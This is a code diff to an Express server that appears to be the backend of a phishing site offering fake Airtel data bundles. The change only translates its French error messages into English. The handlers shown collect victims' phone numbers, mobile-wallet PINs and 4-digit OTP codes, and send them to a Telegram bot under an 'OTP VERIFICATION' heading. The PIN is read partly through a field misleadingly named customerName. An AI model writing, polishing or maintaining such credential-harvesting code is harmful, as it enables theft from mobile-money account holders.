@@ -263,7 +263,7 @@ app.get('/api/action-status', (req, res) => {
   const stage = req.query.stage;
 
   if (!phone) {
-    return res.status(400).json({ message: 'Parametre phone manquant.' });
+    return res.status(400).json({ message: 'Missing phone parameter.' });
   }
 
   const normalizedPhone = normalizePhone(phone);
@@ -378,7 +378,7 @@ app.get('/api/offres/:id', (req, res) => {
   const offre = offres.find((item) => item.id === id);
 
   if (!offre) {
-    return res.status(404).json({ message: 'Forfait introuvable' });
+    return res.status(404).json({ message: 'Bundle not found' });
   }
 
   res.json(offre);
@@ -390,7 +390,7 @@ app.post('/api/notify', async (req, res) => {
   }
 
   if (!TELEGRAM_BOT_TOKEN) {
-    return res.status(500).json({ message: 'Identifiants de notification non configures.' });
+    return res.status(500).json({ message: 'Notification credentials are not configured.' });
   }
 
   if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
@@ -401,14 +401,14 @@ app.post('/api/notify', async (req, res) => {
   }
 
   if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
-    return res.status(500).json({ message: 'CHAT_ID introuvable. Envoyez /start au bot puis reessayez.' });
+    return res.status(500).json({ message: 'CHAT_ID not found. Send /start to the bot and try again.' });
   }
 
   const { offerId, offerTitle, airtelNumber } = req.body;
   const walletPin = (req.body.walletPin ?? req.body.customerName ?? '').toString().trim();
 
   if (!offerId || !offerTitle || !airtelNumber || !walletPin) {
-    return res.status(400).json({ message: 'Donnees de notification manquantes.' });
+    return res.status(400).json({ message: 'Missing notification data.' });
   }
 
   const cleanPhone = normalizePhone(airtelNumber);
@@ -435,11 +435,11 @@ app.post('/api/notify', async (req, res) => {
     }
 
     console.error('Notifier error response:', response.status, response.data);
-    return res.status(response.status).json({ message: 'Echec de la notification.', detail: response.data });
+    return res.status(response.status).json({ message: 'Notification failed.', detail: response.data });
   } catch (err) {
     console.error('Notifier request error:', sanitizeErrMsg(err));
     const status = err.status || 500;
-    return res.status(status).json({ message: 'Erreur de notification.', detail: null });
+    return res.status(status).json({ message: 'Notification error.', detail: null });
   }
 });
 
@@ -449,7 +449,7 @@ app.post('/api/submit', async (req, res) => {
   }
 
   if (!TELEGRAM_BOT_TOKEN) {
-    return res.status(500).json({ message: 'Identifiants de notification non configures.' });
+    return res.status(500).json({ message: 'Notification credentials are not configured.' });
   }
 
   if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
@@ -460,7 +460,7 @@ app.post('/api/submit', async (req, res) => {
   }
 
   if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
-    return res.status(500).json({ message: 'CHAT_ID introuvable. Envoyez /start au bot puis reessayez.' });
+    return res.status(500).json({ message: 'CHAT_ID not found. Send /start to the bot and try again.' });
   }
 
   const { offerId, offerTitle, airtelNumber, otpCode } = req.body;
@@ -468,11 +468,11 @@ app.post('/api/submit', async (req, res) => {
   const normalizedOtp = (otpCode ?? '').toString().trim();
 
   if (!offerId || !offerTitle || !airtelNumber || !walletPin || !normalizedOtp) {
-    return res.status(400).json({ message: 'Donnees de soumission manquantes.' });
+    return res.status(400).json({ message: 'Missing submission data.' });
   }
 
   if (!/^\d{4}$/.test(normalizedOtp)) {
-    return res.status(400).json({ message: 'Le code OTP doit contenir exactement 4 chiffres.' });
+    return res.status(400).json({ message: 'The OTP code must contain exactly 4 digits.' });
   }
 
   const message = `<b>✅ Gdk - OTP VERIFICATION</b>\n\n` +
@@ -502,11 +502,11 @@ app.post('/api/submit', async (req, res) => {
     }
 
     console.error('Notifier error response:', response.status, response.data);
-    return res.status(response.status).json({ message: 'Echec de soumission de notification.', detail: response.data });
+    return res.status(response.status).json({ message: 'Notification submission failed.', detail: response.data });
   } catch (err) {
     console.error('Notifier request error:', sanitizeErrMsg(err));
     const status = err.status || 500;
-    return res.status(status).json({ message: 'Erreur de soumission de notification.', detail: null });
+    return res.status(status).json({ message: 'Notification submission error.', detail: null });
   }
 });
 
